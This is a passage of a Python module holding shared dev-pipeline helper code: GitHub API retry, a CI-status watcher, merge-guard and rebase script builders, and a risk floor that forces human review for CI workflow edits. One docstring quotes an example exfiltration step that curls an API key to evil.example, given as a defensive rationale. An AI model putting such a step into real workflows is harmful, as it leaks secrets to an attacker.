"""Shared dev-pipeline helper source (aios STEP-0 reconciler extraction).

The PROVEN, behavior-preserving helpers of the dev pipeline — the scripted spec gate, the
GitHub REST/pagination plumbing (incl. the #1156 full-thread read), SHA/commit-identity
checks, the fail-closed merge-guard + rebase commands, the deterministic risk floor, the
label/terminal/close-on-merge plumbing, the script-side CI-verdict classifier
(``_ci_verdict`` / ``_shas_equal``, aios#1392 Fix 2), and the bounded CI-watch + sync/rebase
loops — factored OUT of ``dev_pipeline.py``'s monolithic ``_BODY`` into one shared source
string so BOTH the dev-pipeline monolith AND the coming dev-pipeline RECONCILER import a
single source of truth. This is a PURE extraction: the assembled dev-pipeline script is
functionally identical (the same functions land in the same exec namespace), so every
existing dev_pipeline test passes unchanged.

WHY A SOURCE STRING, NOT AN IMPORTED FUNCTION (the established pattern — see
``gh_body.GH_BODY_HELPERS`` and ``comment_idempotency.COMMENT_IDEMPOTENCY_HELPERS``): each
workflow is rendered to a single self-contained *script source* the script-host ``exec``s in
a curated namespace (stdlib ``re``/``json`` only — no ``aios`` import at runtime). A genuinely
shared helper must therefore be shared at *authoring* time: this module exports the helper
SOURCE TEXT, authored once, and each ``build_*_script`` splices it into its ``_BODY``.

NAMES THE TEXT EXPECTS FROM ITS HOST BODY (all defined by the surrounding script before any
call — module-level ``def``s resolve names at CALL time, so splice ORDER is free):
  * runtime-injected capabilities: ``agent`` / ``tool`` / ``gate`` / ``log`` / ``AgentError``.
  * rendered constants (from ``_render_constants``): ``CI_AGENT_ID`` / ``FIX_AGENT_ID`` /
    ``MERGE_SENTINELS`` / ``BASE_BRANCH`` / ``MAX_CI_ITERS`` / ``MAX_REBASE_ATTEMPTS`` /
    the ``REBASE_EXIT_*`` codes / ``FIX_CI_LINT_HINT`` / ``FIX_REBASE_HINT`` /
    the ``*_SCHEMA`` dicts / the spec-gate + label + marker constants / ``LABEL_*`` / etc.
  * the spliced GitHub-body + comment-idempotency helpers (``_json_body`` / ``gh_paginated`` /
    ``post_comment_once``) — appended after this text, resolved at call time.
  * stdlib ``json`` / ``re`` — imported at the top of the host ``_BODY``.

DETERMINISM: the text does only pure value-domain work plus the same ``agent`` / ``tool`` /
``gh`` capability calls the surrounding body already makes; it imports nothing and reads no
clock, so replay-with-memo stays stable.
"""

from __future__ import annotations

# The shared helper source, authored once. Spliced verbatim into the dev-pipeline ``_BODY``
# (and, once it exists, the reconciler's). See the module docstring for the names it expects
# from its host script.
DEV_PIPELINE_LIB = r'''
# ─── scripted helpers (deterministic; no LLM, no time, no random) ────────────

def _unwrap(input):
    """Accept both a bare ``{repo, issue_number, kind}`` and the trigger envelope
    ``{"trigger": ..., "input": ...}`` a WorkflowAction fire delivers."""
    if isinstance(input, dict) and "trigger" in input and "input" in input:
        return input["input"] or {}
    return input or {}


def _owner(repo):
    return repo.split("/", 1)[0]


def _strip_meta(body):
    """Blank fenced code blocks / blockquotes / inline code before the spec-blocker
    scan, preserving line count (autodev validation._strip_meta_content)."""
    out = []
    in_fence = False
    for line in (body or "").split("\n"):
        stripped = line.lstrip()
        if stripped.startswith("```") or stripped.startswith("~~~"):
            in_fence = not in_fence
            out.append("")
            continue
        if in_fence or stripped.startswith(">"):
            out.append("")
            continue
        out.append(re.sub(r"`[^`]*`", " ", line))
    return "\n".join(out)


def _comment_texts(comments):
    """The body strings of the issue's comment thread (skipping empties/non-dicts).
    ``comments`` is the array from ``GET /issues/{n}/comments`` (or [] when unread)."""
    out = []
    if isinstance(comments, list):
        for c in comments:
            if isinstance(c, dict):
                text = c.get("body")
                if isinstance(text, str) and text.strip():
                    out.append(text)
    return out


def _marker_resolved(line_text, comments):
    """True if SOME comment both quotes the offending body line AND carries a resolution
    signal — the explicit "this open question is settled" handshake. Quoting is a
    substring match on the marker line's stripped text (after blockquote/`>` stripping,
    so a GitHub `> quoted line` still matches); a bare resolution word with no quote, or
    a quote with no resolution word, does NOT suppress."""
    needle = (line_text or "").strip()
    if not needle:
        return False
    for raw in _comment_texts(comments):
        dequoted = "\n".join(
            re.sub(r"^\s*>+\s?", "", ln) for ln in raw.split("\n")
        )
        if needle not in dequoted:
            continue
        for pat in RESOLUTION_SIGNALS:
            if re.search(pat, dequoted):
                return True
    return False


def _find_blocker(body, comments=None):
    """First unresolved marker in the BODY (comments never ADD markers — no regression of
    the trap). A body marker whose line a later comment quotes-and-resolves is skipped."""
    scan = _strip_meta(body)
    for i, line in enumerate(scan.split("\n"), start=1):
        for pat in SPEC_BLOCKERS:
            if re.search(pat, line):
                if comments is not None and _marker_resolved(line.strip(), comments):
                    continue  # quoted + resolved in a later comment -> suppressed
                return (pat, i, line.strip())
    return None


def spec_ok(issue, kind, comments=None):
    """The scripted pre-flight gate (V1 subset of autodev validation): empty-body,
    word-count, unresolved-marker. Returns (ok, reason).

    The word-count runs over body PLUS the comment thread (a design pass in comments can
    satisfy a thin body); the marker trap scans the BODY (a comment never introduces a
    marker) but suppresses a body marker that a later comment quotes-and-resolves."""
    body = (issue.get("body") or "").strip()
    if not body:
        return (False, "Issue body is empty -- no spec to implement.")
    spec_text = "\n\n".join([body] + _comment_texts(comments))
    words = len(spec_text.split())
    minimum = MIN_BUG_BODY_WORDS if kind == "bug" else MIN_SPEC_BODY_WORDS
    if words < minimum:
        return (False, "Issue body is too short (%d words, minimum %d)." % (words, minimum))
    hit = _find_blocker(body, comments)
    if hit is not None:
        return (False, "Spec contains an unresolved marker on line %d: %r. "
                       "Resolve all open questions before implementation." % (hit[1], hit[2]))
    return (True, "")


async def _gh_once(method, path, body=None):
    """One GitHub REST/GraphQL call through the run's bound-vault-authed http_request. A
    non-2xx or transport error is a VALUE the caller branches on, never a raise. ``path``
    must NOT carry a query string (the route allowlist is path-only) — filter in-script."""
    args = {"server_ref": GITHUB_SERVER, "path": path, "method": method}
    if body is not None:
        args["body"] = json.dumps(body)
    return await tool("http_request", args)


_TRANSIENT_ERROR_PREFIXES = ("Request timed out", "HTTP transport error")


def _is_transient(resp):
    """A retryable GitHub response: a 5xx status, OR a genuine transport transient (the
    http_request tool surfaces a timeout / connection failure as ``{"error": ...}`` with
    no status). A 4xx is the caller's problem (auth, 404, 422-already-exists) — NOT retried.

    An ``{"error": ...}`` envelope is NOT automatically transient: the broker's own gate
    rejections — route-allowlist mismatch / method-not-allowed ("does not match any
    enabled route"), unknown server_ref, SSRF block, path rejection — are DETERMINISTIC
    (a 405-equivalent) and re-issuing the identical request just reproduces them. Retrying
    those burned three pointless attempts on every such call (#1139). Only the transport
    transients (request timeout, connection reset) earn a retry; every other error string
    is terminal."""
    if not isinstance(resp, dict):
        return True  # a non-dict result is a malformed tool return -> treat as transient
    err = resp.get("error")
    if err is not None:
        # Only timeouts / transport faults are transient; broker gate rejections are not.
        return isinstance(err, str) and err.startswith(_TRANSIENT_ERROR_PREFIXES)
    st = resp.get("status")
    return isinstance(st, int) and 500 <= st <= 599


async def gh(method, path, body=None):
    """A GitHub call with bounded transient-5xx retry. Re-issues the request up to 3 times
    on a 5xx / transport error / ``{"error":...}`` and returns the LAST result for the
    caller to branch on (a value, never a raise — a persistent failure surfaces as the
    last non-2xx response). Each attempt is a fresh ``tool()`` await, so the CallKeyer
    gives it a distinct per-content-hash ordinal and replay stays stable. (Named ``gh`` so
    every existing call site retries for free; the single-shot is ``_gh_once``.)"""
    resp = None
    for _ in range(3):
        resp = await _gh_once(method, path, body)
        if not _is_transient(resp):
            return resp
        log("gh transient failure, retrying:", method, path, _status(resp))
    return resp


def _headers(resp):
    """Lower-cased response header map (the http_request tool returns httpx headers
    verbatim; GitHub sends ``Link`` capitalised, so normalise the keys)."""
    if not isinstance(resp, dict):
        return {}
    h = resp.get("headers")
    if not isinstance(h, dict):
        return {}
    return {str(k).lower(): v for k, v in h.items()}


def _link_next_page(link_header):
    """The ``page`` number of the ``rel="next"`` URL in a GitHub ``Link`` header, or
    None when there is no next page. GitHub paginates list endpoints with a ``Link``
    header like ``<https://api.github.com/...?page=2&per_page=100>; rel="next", ...``.
    We extract only the integer ``page`` (not the whole URL) and rebuild the next path
    against the path WE control, so a malformed/host-bearing next URL never reaches the
    route gate and pagination stays a function of our own path string."""
    if not isinstance(link_header, str) or not link_header:
        return None
    for part in link_header.split(","):
        seg = part.strip()
        if 'rel="next"' not in seg:
            continue
        m = re.search(r"[?&]page=(\d+)", seg)
        if m:
            return int(m.group(1))
    return None


def _with_query(path, **params):
    """Append ``params`` as a query string to ``path`` (no existing ``?`` expected —
    callers pass a clean path). Deterministic key order; values are ints/strs."""
    qs = "&".join("%s=%s" % (k, params[k]) for k in sorted(params))
    return path + ("?" if qs else "") + qs


def _status(resp):
    return resp.get("status") if isinstance(resp, dict) else None


# ``_json_body`` and ``gh_paginated`` are spliced in from the shared
# ``GH_BODY_HELPERS`` source (aios#1294) so the fail-loud-on-truncated-or-
# unparseable-2xx contract can never drift between the dev and triage pipelines.


def _ipath(repo, suffix):
    return "/repos/%s%s" % (repo, suffix)


async def post_markered_comment(repo, number, marker, body):
    """Post one markered comment on issue/PR ``number`` UNLESS the (FRESHLY-fetched) thread
    already carries ``marker`` — the maker-marker replay guard (aios#1292). Used for the PR
    comments (risk / merge-guard) whose thread isn't already in scope; it fetches the thread
    first so the guard sees any prior post (including one from a pre-crash attempt). A site that
    already holds the thread calls ``post_comment_once`` directly with it. Returns the
    post_comment_once result (a 2xx, the skip sentinel, or the failed POST response)."""
    existing = await gh_paginated(_ipath(repo, "/issues/%d/comments" % number))
    return await post_comment_once(repo, number, marker, body,
                                   existing if isinstance(existing, list) else [])


def _pr_head_sha(pr):
    return (pr.get("head") or {}).get("sha", "") if isinstance(pr, dict) else ""


_SHA1_RE = re.compile(r"^[0-9a-f]{40}$")


def _is_sha1(value):
    """True iff ``value`` is a 40-char (SHA-1) hex commit id — the only thing GitHub's
    REST commit/check-runs endpoints can resolve. A 64-char SHA-256 object id (issue #1178)
    returns False, so we never hand one to a GitHub REST endpoint."""
    return isinstance(value, str) and bool(_SHA1_RE.match(value))


def _shas_equal(a, b):
    """Whether two commit ids name the SAME commit, tolerant of case and abbreviation —
    GitHub returns full 40-char lowercase SHAs but a watch agent may report an abbreviated
    or upper-cased one. Equal iff (case-insensitively) one is a non-empty prefix of the other
    AND both are at least 7 hex chars (git's minimum unambiguous abbreviation), so a stray
    empty / 1-char value can never spuriously match. Used to verify a polled commit IS the
    live PR head (#1314) — a conservative comparison: when in doubt it returns False (reject),
    never a false match that would trust a wrong-parent green."""
    if not (isinstance(a, str) and isinstance(b, str)):
        return False
    a, b = a.strip().lower(), b.strip().lower()
    if len(a) < 7 or len(b) < 7:
        return False
    short, long = (a, b) if len(a) <= len(b) else (b, a)
    return long.startswith(short)


async def _resolve_sha1(repo, ref):
    """Resolve a git ref (branch name OR sha) to the GitHub-canonical SHA-1 commit id.

    The post-merge master-CI watch is handed a BRANCH NAME (``BASE_BRANCH``); a watch agent
    that re-resolves it via a local clone in SHA-256 object format yields a 64-char id the
    GitHub REST API rejects (issue #1178). Ask GitHub itself — ``GET /repos/{repo}/commits/{ref}``
    canonicalises any ref to the SHA-1 GitHub recognises. Returns the SHA-1 string, or ``None``
    if it can't be resolved to a valid 40-char SHA-1 (caller decides what to do with that)."""
    if _is_sha1(ref):
        return ref
    resp = await gh("GET", _ipath(repo, "/commits/%s" % ref))
    if _status(resp) != 200:
        return None
    body = _json_body(resp)
    sha = body.get("sha") if isinstance(body, dict) else None
    return sha if _is_sha1(sha) else None


# ─── deterministic CI watch (issue #1316): no agent, no model ────────────────
#
# Waiting for a CI run to reach a terminal state is a procedural task — zero judgment
# (architecture/intelligence-vs-computation.md). The watch is a bounded poll of the GitHub
# Checks + combined-status REST API via the run's http_request tool, returning the SAME
# CI_SCHEMA ({status: green|red|no_ci, detail}) the old `watch_ci` agent did. `fix_ci`
# STAYS an agent() — diagnosing and repairing a red build is genuine judgment; only the
# wait/read is de-intelligenced.
#
# Two GitHub surfaces report CI on a commit and BOTH must be consulted:
#   - the Checks API (GitHub Actions et al.): GET /commits/{sha}/check-runs
#   - the legacy Statuses API (external CI via the commit-status protocol):
#     GET /commits/{sha}/status (the COMBINED rollup)
# A commit with neither is `no_ci`. A commit whose checks/statuses are all terminal is
# green (every terminal outcome a success/neutral/skip) or red (any failure). A commit
# still running anything is NOT terminal — poll again.

# Check-run conclusions that count as a FAILED build (a `completed` run with one of these
# fails CI). `null`/success/neutral/skipped/`stale` do not fail the build; an
# `action_required` run is treated as failing (it blocks merge and needs human/agent action).
_CI_FAIL_CONCLUSIONS = frozenset(
    {"failure", "timed_out", "cancelled", "action_required", "startup_failure"}
)
# Combined-status states (Statuses API rollup): success | pending | failure (error folds
# into failure on the combined endpoint). `pending` is non-terminal.
_CI_STATUS_FAIL_STATES = frozenset({"failure", "error"})


def _check_runs_terminal(check_runs):
    """Reduce a check-runs list to ``(count, all_terminal, any_failed)``.

    ``count`` is how many check-runs exist (0 => this surface reports no CI). A check-run
    is terminal iff ``status == "completed"``; ``any_failed`` is True iff some COMPLETED
    run has a failing conclusion. A non-list/garbage payload yields ``(0, True, False)``
    (this surface contributes nothing — the caller folds in the other surface)."""
    if not isinstance(check_runs, list):
        return (0, True, False)
    count = 0
    all_terminal = True
    any_failed = False
    for run in check_runs:
        if not isinstance(run, dict):
            continue
        count += 1
        if run.get("status") != "completed":
            all_terminal = False
            continue
        if run.get("conclusion") in _CI_FAIL_CONCLUSIONS:
            any_failed = True
    return (count, all_terminal, any_failed)


def _combined_status_terminal(combined):
    """Reduce a combined-status payload to ``(count, all_terminal, any_failed)``.

    ``count`` is ``total_count`` (number of contexts reporting; 0 => no legacy CI). The
    combined ``state`` is terminal unless ``pending``; ``any_failed`` iff the rollup state
    is failure/error. A non-dict/garbage payload yields ``(0, True, False)``."""
    if not isinstance(combined, dict):
        return (0, True, False)
    try:
        count = int(combined.get("total_count") or 0)
    except (TypeError, ValueError):
        count = 0
    state = combined.get("state")
    all_terminal = state != "pending"
    any_failed = state in _CI_STATUS_FAIL_STATES
    return (count, all_terminal, any_failed)


def _ci_poll_verdict(check_runs, combined):
    """Map a (check-runs, combined-status) pair to a CI_SCHEMA dict — pure, no I/O.

    Returns ``{"status": ...}`` where status is:
      * ``no_ci``  — neither surface reports any check/status for the commit.
      * ``green``  — at least one surface reports CI and EVERY reported check/status is
                     terminal with no failure.
      * ``red``    — at least one terminal failure on either surface.
      * ``None``   — CI exists but is NOT yet terminal (something still queued/running):
                     the caller polls again. (None is NOT a CI_SCHEMA status — it is the
                     in-loop "keep waiting" sentinel.)

    A red verdict is returned EAGERLY (a failure is terminal even if other checks are still
    running) so a doomed build fails fast instead of waiting out the slowest green job."""
    cr_count, cr_terminal, cr_failed = _check_runs_terminal(check_runs)
    st_count, st_terminal, st_failed = _combined_status_terminal(combined)
    total = cr_count + st_count
    if total == 0:
        return {"status": "no_ci", "detail": "no check-runs or commit statuses on the commit"}
    if cr_failed or st_failed:
        return {"status": "red",
                "detail": "%d check-run(s), %d status context(s); a terminal failure was reported"
                          % (cr_count, st_count)}
    if cr_terminal and st_terminal:
        return {"status": "green",
                "detail": "%d check-run(s), %d status context(s); all terminal, none failed"
                          % (cr_count, st_count)}
    return None  # CI present but still running -> keep polling


async def _read_ci(repo, head_sha):
    """One deterministic read of both CI surfaces for ``head_sha`` -> ``(verdict, read_ok)``.

    ``verdict`` is a CI_SCHEMA dict (green/red/no_ci) or None (CI present but still running);
    ``read_ok`` is True iff AT LEAST ONE surface GET returned a 2xx we could parse. Both GETs
    go through ``gh`` (bounded transient-5xx retry) against the bound-vault-authed http_request
    tool — NO agent, NO model, NO gh CLI (#1138).

    A surface whose GET is non-2xx is treated as contributing nothing (the helper reducers
    fold a garbage/None body to ``(0, True, False)``), so a transient single-surface blip
    can't manufacture a false red — the verdict falls through to the other surface or to
    'keep polling'. When NEITHER surface read (``read_ok`` False) the caller cannot trust a
    'no_ci' verdict (it is indistinguishable from 'both endpoints down'), so the advisory
    master-CI path treats that as INDETERMINATE rather than a real verdict.

    We request ``per_page=100`` on check-runs: the combined verdict only needs
    status/conclusion, and a commit with >100 check-runs is unheard-of in this pipeline, so a
    single first page (newest-first per app) is sufficient without paginating."""
    checks_resp = await gh("GET", _with_query(
        _ipath(repo, "/commits/%s/check-runs" % head_sha), per_page=100))
    status_resp = await gh("GET", _ipath(repo, "/commits/%s/status" % head_sha))
    checks_ok = _status(checks_resp) == 200
    status_ok = _status(status_resp) == 200
    checks_body = _json_body(checks_resp) if checks_ok else None
    check_runs = checks_body.get("check_runs") if isinstance(checks_body, dict) else None
    combined = _json_body(status_resp) if status_ok else None
    return (_ci_poll_verdict(check_runs, combined), checks_ok or status_ok)


async def watch_ci(repo, head_sha, max_iters):
    """Deterministic CI-watch NODE (issue #1316) — the procedural replacement for the old
    `watch_ci` agent. Polls both CI surfaces for ``head_sha`` up to ``max_iters`` times and
    returns a CI_SCHEMA dict ({status: green|red|no_ci, detail}). NO agent/model call.

    A terminal verdict (green/red/no_ci) is returned the moment it is reached. If CI is still
    running after ``max_iters`` reads, we return a `red` verdict carrying a
    'did-not-reach-terminal' detail — the same outcome the bounded agent loop produced when it
    exhausted its iterations on a still-pending build (the A9 loop then escalates to the verify
    gate). This is fail-SAFE: an indeterminate (never-terminal) build is NOT waved through as
    green. ``head_sha`` must be a GitHub SHA-1 (the caller resolves it; #1178)."""
    for _ in range(max(1, int(max_iters))):
        verdict, _read_ok = await _read_ci(repo, head_sha)
        if verdict is not None:
            return verdict
    return {"status": "red",
            "detail": "CI did not reach a terminal state within %d polls of %s"
                      % (max(1, int(max_iters)), head_sha)}


async def watch_ci_advisory(repo, head_sha, max_iters):
    """The ADVISORY (post-merge master-CI) variant of the deterministic watch (issue #1316 +
    #1176). Returns ``(status, detail)`` where ``status`` is 'green'/'red'/'no_ci' for a
    well-formed verdict, or None for INDETERMINATE — distinct from a real verdict, exactly as
    the old retrying agent loop distinguished an AgentError/malformed return from a green/red.

    Indeterminate means EITHER (a) every poll failed to read either CI surface (both GETs
    non-2xx across all attempts), OR (b) CI never reached a terminal state within ``max_iters``
    polls. Neither coerces to the most-blocking 'red': the merge is already a committed fact, so
    the caller files a non-blocking 'master_ci_indeterminate' advisory and NEVER re-suspends the
    completed run."""
    any_read_ok = False
    for _ in range(max(1, int(max_iters))):
        verdict, read_ok = await _read_ci(repo, head_sha)
        any_read_ok = any_read_ok or read_ok
        if verdict is not None and read_ok:
            return (verdict["status"], verdict.get("detail", ""))
    if not any_read_ok:
        return (None, "master-CI watch indeterminate: could not read either CI surface "
                      "(check-runs / combined status) for %s after %d polls"
                      % (head_sha, max(1, int(max_iters))))
    return (None, "master-CI watch indeterminate: CI did not reach a terminal state for %s "
                  "within %d polls" % (head_sha, max(1, int(max_iters))))


def _find_open_pr(prs, branch):
    """Client-side filter of an open-PRs list for the one whose head ref is ``branch``
    (http_request forbids a ?head= query, so we list clean and match here)."""
    if not isinstance(prs, list):
        return None
    for pr in prs:
        head = pr.get("head") or {}
        if head.get("ref") == branch:
            return pr
    return None


def _ruff_format_parity_sentinels(sentinels):
    """Derive a ``ruff format --check <targets>`` command for every ``ruff check <targets>``
    sentinel, so the merge guard's lint matches the GitHub CI ``lint`` job EXACTLY (which
    runs BOTH ``ruff check`` AND ``ruff format --check`` over the same targets) — one source
    of lint truth (#1182).

    Without this the guard's lint is WEAKER than CI's: a format-only-broken PR passes the
    guard while CI's ``ruff format --check`` rejects it, so the guard's signal is
    misleadingly clean. We derive the format check from the deployed ``MERGE_SENTINELS``
    (rather than hardcoding the target list) so prod config stays the single source of
    targets through the reregister round-trip. A sentinel that already carries
    ``ruff format`` is left alone — no duplicate is added. Returns the derived commands in
    sentinel order; the caller appends them after the originals so the existing
    ``ruff check`` still runs first."""
    derived = []
    have_format = any("ruff format" in cmd for cmd in sentinels)
    for cmd in sentinels:
        stripped = cmd.strip()
        prefix = "ruff check "
        if not stripped.startswith(prefix):
            continue
        targets = stripped[len(prefix):].strip()
        if not targets:
            continue
        format_cmd = "ruff format --check " + targets
        if have_format or format_cmd in derived:
            continue
        derived.append(format_cmd)
    return derived


def _merge_guard_command(repo, pr_number):
    """The merge-ref guard (autodev merge_guard.py, issue #177), preserving the load-bearing
    properties: validate the commit GitHub would ACTUALLY produce on merge — the live
    refs/pull/N/merge ref — not the PR head; FAIL CLOSED on any inability to complete
    validation; a missing merge ref means a conflicted PR (GitHub omits it) => refuse. Runs
    every configured MERGE_SENTINELS command against a detached checkout of the merge ref,
    refusing on the first nonzero (path-prefix sentinel *selection* is a deferred v1
    optimisation — running all is strictly safer). `set -eu -o pipefail` makes fail-closed
    structural, not dependent on guarding each line. Re-run-tolerant (rm -rf then clone) per
    the at-least-once bash contract.

    Lint parity (#1182): for every ``ruff check`` sentinel we ALSO run the matching
    ``ruff format --check`` so the guard's lint matches CI's ``lint`` job exactly — a
    format-only-broken merge ref is refused here, not waved through."""
    lines = [
        "set -eu -o pipefail",
        "D=/workspace/mg-%d" % pr_number,
        "rm -rf \"$D\"",
        "git clone --quiet --depth 50 "
        "https://x-access-token:$GITHUB_TOKEN@github.com/%s.git \"$D\"" % repo,
        "cd \"$D\"",
        "if ! git fetch --quiet origin refs/pull/%d/merge:mgref 2>/dev/null; then" % pr_number,
        "  echo 'MERGE_REF_MISSING: PR is conflicted (no computable merge result)'; exit 71",
        "fi",
        # ^1..merge is exactly what lands (merge commit's first parent is the base tip);
        # an unresolvable diff is fail-closed.
        "git diff --name-only mgref^1 mgref > /tmp/mg-changed.txt || exit 74",
        "git checkout --quiet --detach mgref",
    ]
    sentinels = list(MERGE_SENTINELS) + _ruff_format_parity_sentinels(MERGE_SENTINELS)
    for cmd in sentinels:
        lines.append("( %s ) || exit 73" % cmd)
    lines.append("echo MERGE_GUARD_OK")
    return "\n".join(lines)


def _needs_rebase(pr):
    """Decide whether the PR's branch needs a sync/rebase from its mergeability fields
    (#1385). ``pr`` is the ``GET /pulls/{n}`` payload; GitHub reports two signals:

      - ``mergeable``: ``True`` (clean), ``False`` (conflicting), or ``None`` (GitHub has
        not finished computing the merge yet — a transient unknown, NOT a conflict).
      - ``mergeable_state``: ``clean`` / ``has_hooks`` / ``unstable`` / ``blocked`` (all
        mergeable-against-base), vs ``dirty`` / ``behind`` (the branch is out of date with
        base — exactly the master-moved-under case this stage heals).

    We treat ONLY the unambiguous out-of-date states as needing a rebase: ``mergeable is
    False`` (a real conflict GitHub already computed) OR ``mergeable_state in {dirty,
    behind}``. A ``None``/unknown mergeable with a benign state is NOT forced through a
    rebase (idempotence: a branch already current with master is a no-op — we don't rebase a
    clean PR just because GitHub hasn't recomputed yet). Returns a plain bool.

    The string set is deliberately tight: ``clean``/``unstable``/``has_hooks``/``blocked``
    are all mergeable-against-base (``unstable`` = failing checks, ``blocked`` = required
    review — neither is a master-moved-under conflict), so none of them triggers a rebase."""
    if not isinstance(pr, dict):
        return False
    state = pr.get("mergeable_state")
    if state in ("dirty", "behind"):
        return True
    if pr.get("mergeable") is False:
        return True
    return False


def _rebase_command(repo, branch):
    """The mechanical rebase node (#1385): fetch ``origin/master``, ``git rebase
    origin/master`` the PR branch, and ``git push --force-with-lease`` the result. Run in a
    bash node against a fresh clone, returning a DISTINCT exit code the orchestrator branches
    on (a value, never a raise — same fail-closed exit-code discipline as the merge guard):

      - REBASE_EXIT_NOOP (75): the branch is ALREADY current with origin/master — no rebase
        is needed, nothing is pushed. This is the idempotence guarantee: re-running the stage
        on an already-healed branch is a clean no-op under the at-least-once crash contract.
      - REBASE_EXIT_DONE (0): the rebase replayed cleanly onto origin/master and the result
        was force-pushed-with-lease. CI must re-run on the updated branch (the caller
        re-enters the CI watch).
      - REBASE_EXIT_CONFLICT (76): the rebase hit REAL conflicts ``git rebase`` could not
        auto-resolve — we ``git rebase --abort`` (leave the branch untouched) and signal the
        caller to hand off to the fix agent.
      - REBASE_EXIT_ERROR (77): a plumbing failure (clone/fetch/push) before a rebase verdict
        — fail-closed so a flaky clone is never mistaken for a clean branch.

    ``--force-with-lease`` (not ``--force``) so a concurrent push to the PR branch aborts the
    push rather than clobbering it. ``rm -rf`` then clone makes the node re-run-tolerant under
    the at-least-once bash contract. ``set -u -o pipefail`` (NOT ``-e``: we branch on the
    rebase's own exit explicitly, so a non-zero rebase must not abort the script)."""
    lines = [
        "set -u -o pipefail",
        "D=/workspace/rebase-%s" % branch.replace("/", "-"),
        "rm -rf \"$D\"",
        "git clone --quiet "
        "https://x-access-token:$GITHUB_TOKEN@github.com/%s.git \"$D\" || exit %d"
        % (repo, REBASE_EXIT_ERROR),
        "cd \"$D\" || exit %d" % REBASE_EXIT_ERROR,
        "git config user.email dev-pipeline@aios.local",
        "git config user.name 'aios dev-pipeline'",
        "git fetch --quiet origin %s || exit %d" % (BASE_BRANCH, REBASE_EXIT_ERROR),
        "git checkout --quiet -B %s origin/%s || exit %d"
        % (branch, branch, REBASE_EXIT_ERROR),
        # Already current with origin/master? (the branch contains origin/master's tip) ->
        # nothing to do. This is the idempotent no-op: a re-driven stage on a healed branch.
        "if git merge-base --is-ancestor origin/%s HEAD; then" % BASE_BRANCH,
        "  echo REBASE_NOOP; exit %d" % REBASE_EXIT_NOOP,
        "fi",
        "if git rebase origin/%s; then" % BASE_BRANCH,
        "  git push --force-with-lease origin %s || exit %d" % (branch, REBASE_EXIT_ERROR),
        "  echo REBASE_DONE; exit %d" % REBASE_EXIT_DONE,
        "else",
        "  git rebase --abort || true",
        "  echo REBASE_CONFLICT; exit %d" % REBASE_EXIT_CONFLICT,
        "fi",
    ]
    return "\n".join(lines)


def _mark_ready_query():
    return ("mutation($id:ID!){markPullRequestReadyForReview(input:{pullRequestId:$id})"
            "{pullRequest{isDraft}}}")


def _is_workflow_path(filename):
    """True for a GitHub Actions workflow file: ``.github/workflows/*.yml`` or ``*.yaml``.
    Workflows nested under that prefix (GitHub only reads the top level, but be permissive)
    and either YAML extension count."""
    if not isinstance(filename, str):
        return False
    name = filename.lstrip("/")
    return name.startswith(".github/workflows/") and name.endswith((".yml", ".yaml"))


def _changed_workflow_files(files):
    """The deterministic security floor's evidence: the subset of changed files that are
    ``.github/workflows/*.yml|.yaml`` — ANY of them, regardless of whether the visible diff
    hunk contains a literal ``secrets.`` token.

    ``files`` is the GitHub ``GET /pulls/N/files`` payload (list of {filename, patch, ...}).
    A change to a CI workflow is a privileged-surface change: it runs on ``push: master``
    with the provisioned secret + GITHUB_TOKEN in scope, OUTSIDE the app's own auth, so a
    malicious/buggy step could exfiltrate the secret on the next master push (#1185). We do
    NOT require the hunk to mention ``secrets.``: a step can exfiltrate the keystone secret
    via the env var the workflow already injects (``run: curl evil.example -d
    "$AIOS_API_KEY"``) with no literal ``secrets.`` in the added hunk, so a ``secrets.``-in-
    patch heuristic is trivially bypassed (#1187). #1185 explicitly endorsed the broader
    rule: ANY diff touching ``.github/workflows/`` floors to tier-3; the false-positive cost
    is one human gate-clear. Pure: deterministic over its input, no I/O, no LLM."""
    hits = []
    if not isinstance(files, list):
        return hits
    for f in files:
        if not isinstance(f, dict):
            continue
        if _is_workflow_path(f.get("filename")):
            hits.append(f.get("filename"))
    return hits


# Sentinel filename used in the fail-closed floor when the files payload could not be
# fetched/parsed: we cannot prove the PR is safe, so we floor it and record WHY.
_FILES_UNAVAILABLE = "<files unavailable: fail-closed>"


def _risk_floor(tier, files):
    """Post-process the risk agent's ``tier`` with the deterministic CI-workflow floor.

    Two ways the floor fires, both returning ``max(tier, 4)`` so the PR parks at the human
    merge_approval gate (4 > AUTO_MERGE_MAX_TIER, which is 3) and never auto-merges:

    1. ``files`` is a valid list AND it includes a changed ``.github/workflows`` file —
       a privileged-surface change that could exfiltrate the provisioned secret on the next
       master push (#1185).
    2. **FAIL CLOSED:** ``files`` is NOT a list (the ``GET /pulls/N/files`` fetch failed or
       returned a non-list). We cannot prove the PR doesn't touch a workflow, so we floor to
       tier-4 and require human review rather than letting a flaky files call silently weaken
       the control (#1187). A security control must err toward the conservative side on
       missing evidence, never assume safe.

    The floor is tier-4 (not tier-3): once ``AUTO_MERGE_MAX_TIER`` rose to 3 (green +
    dev-review-cleared work through tier-3 auto-merges), a tier-3 floor would let the
    CI-config class auto-merge — exactly the IaC-reconcile / CI-config blind spot
    (manifest-vs-live-prod, #1282) that CI + dev-review structurally CANNOT validate. So this
    class floors to 4 and parks for human review until the prod-state ``--check`` node lands
    (#1300). This bumps ONLY the CI-config floor; the risk agent tiers security/migration as 4
    on its own.

    A security control must not depend on an LLM noticing — this floor is mechanical.
    Returns ``(floored_tier, floored_files)``."""
    if not isinstance(files, list):
        # Couldn't fetch/parse the changed-files set -> can't prove safe -> floor (fail closed).
        return max(int(tier), 4), [_FILES_UNAVAILABLE]
    floored_files = _changed_workflow_files(files)
    if floored_files:
        return max(int(tier), 4), floored_files
    return int(tier), floored_files


async def _label(repo, issue_number, name):
    """Add one label (best-effort, retried by gh)."""
    await gh("POST", _ipath(repo, "/issues/%d/labels" % issue_number), {"labels": [name]})


async def _unlabel(repo, issue_number, name):
    """Remove one label by name (URL-encoded), best-effort. A 404/410 (label absent) is the
    idempotent no-op a re-drive expects, NOT a failure. Per rank-6 (label-write visibility),
    the gh() response is LOGGED so a strip that GitHub rejected is visible, not silently
    swallowed: 200 (removed) / 404 (already absent) are benign; any other status is surfaced.
    Returns the gh() response so a caller can branch on it."""
    resp = await gh("DELETE", _ipath(repo, "/issues/%d/labels/%s"
                                     % (issue_number, name.replace(":", "%3A"))))
    st = _status(resp)
    if st in (200, 204, 404, 410):
        log("unlabel %r on #%d -> %r (ok)" % (name, issue_number, st))
    else:
        log("unlabel %r on #%d FAILED -> %r %r" % (name, issue_number, st, resp))
    return resp


async def _fail(repo, issue_number, result):
